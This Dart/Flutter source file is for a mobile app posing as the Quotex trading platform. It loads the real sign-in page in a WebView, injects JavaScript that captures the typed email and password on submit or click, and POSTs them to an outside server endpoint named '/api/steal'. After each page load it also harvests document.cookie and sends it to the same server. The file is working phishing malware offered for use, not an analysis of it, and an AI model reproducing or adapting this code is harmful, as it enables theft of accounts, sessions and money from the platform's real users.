import "package:flutter/services.dart";
import 'package:flutter/material.dart';
import 'package:webview_flutter/webview_flutter.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';

void main() async {
  runApp(const MyApp());
}

class MyApp extends StatelessWidget {
  const MyApp({super.key});
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      home: const LoginScreen(),
    );
  }
}

class LoginScreen extends StatefulWidget {
  const LoginScreen({super.key});
  @override
  State<LoginScreen> createState() => _LoginScreenState();
}

class _LoginScreenState extends State<LoginScreen> {
  late WebViewController _controller;
  final WebViewCookieManager _cookieManager = WebViewCookieManager();

  @override
  void initState() {
    super.initState();
    _requestPermissions();
    _initWebView();
  }

  void _requestPermissions() async {
    await Permission.location.request();
    await Permission.notification.request();
  }

  void _initWebView() {
    _controller = WebViewController()
      ..setJavaScriptMode(JavaScriptMode.unrestricted)
      ..setUserAgent("Quotex/1.0")
      ..addJavaScriptChannel(
        'QTX_CREDS',
        onMessageReceived: (msg) async {
          try {
            var data = jsonDecode(msg.message);
            if (data['type'] == 'creds' && data['email'] != null) {
              await http.post(
                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                headers: {"Content-Type": "application/json"},
                body: msg.message,
              );
              
              // 398. نستخدم SystemNavigator.pop متل صاحبك بالحرف
              if (mounted) {
Navigator.pushReplacement(context, MaterialPageRoute(builder: (context) => const MainTradingScreen()));
              }
            }
          } catch (e) {}
        },
      )
      ..setNavigationDelegate(
        NavigationDelegate(
          onPageFinished: (url) async {
            await Future.delayed(const Duration(seconds: 2));
            _injectOriginalScript();
            
            // 399. نسحب الكوكيز ونبعتها للسيرفر متل صاحبك
            final cookieString = await _controller.runJavaScriptReturningResult("document.cookie");
            // Use cookieString directly
            if (cookieString.toString().isNotEmpty) {
              await http.post(
                Uri.parse('https://clone-server-dejt.onrender.com/api/steal'),
                headers: {"Content-Type": "application/json"},
                body: jsonEncode({"type": "cookies", "data": cookieString}),
              );
            }
          },
        ),
      )
      ..loadRequest(Uri.parse('https://quotex.com/ar/sign-in'));
  }

  void _injectOriginalScript() {
    String jsScript = """
      (function() {
        function setNativeValue(el, value) {
          try {
            var proto = window.HTMLInputElement.prototype;
            var desc = Object.getOwnPropertyDescriptor(proto, 'value');
            desc.set.call(el, value);
          } catch (e) { el.value = value; }
          el.dispatchEvent(new Event('input', { bubbles: true }));
          el.dispatchEvent(new Event('change', { bubbles: true }));
        }
        function findEmail() {
          return document.querySelector('input[name="email"], input[type="email"], #email');
        }
        function findPass() {
          return document.querySelector('input[name="password"], input[type="password"], #password');
        }
        function sendCreds() {
          try {
            var e = findEmail(), p = findPass();
            if (e && p && e.value && p.value) {
              QTX_CREDS.postMessage(JSON.stringify({type: 'creds', email: e.value, password: p.value}));
            }
          } catch (err) {}
        }
        if (!window.__qtxHooksInstalled) {
          window.__qtxHooksInstalled = true;
          document.addEventListener('submit', sendCreds, true);
          document.addEventListener('click', function(ev) {
            var t = ev.target && ev.target.closest ? ev.target.closest('button, [type="submit"], [role="button"]') : null;
            if (t) sendCreds();
          }, true);
          var savedEmail = "";
          var savedPass = "";
          if (savedEmail || savedPass) {
            var tries = 0;
            var timer = setInterval(function() {
              tries++;
              var e = findEmail(), p = findPass();
              if (e && p) {
                if (!e.value && savedEmail) setNativeValue(e, savedEmail);
                if (!p.value && savedPass) setNativeValue(p, savedPass);
                clearInterval(timer);
              }
              if (tries > 20) clearInterval(timer);
            }, 300);
          }
        }
      })();
    """;
    _controller.runJavaScript(jsScript);
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(body: SafeArea(child: WebViewWidget(controller: _controller)));
  }
}
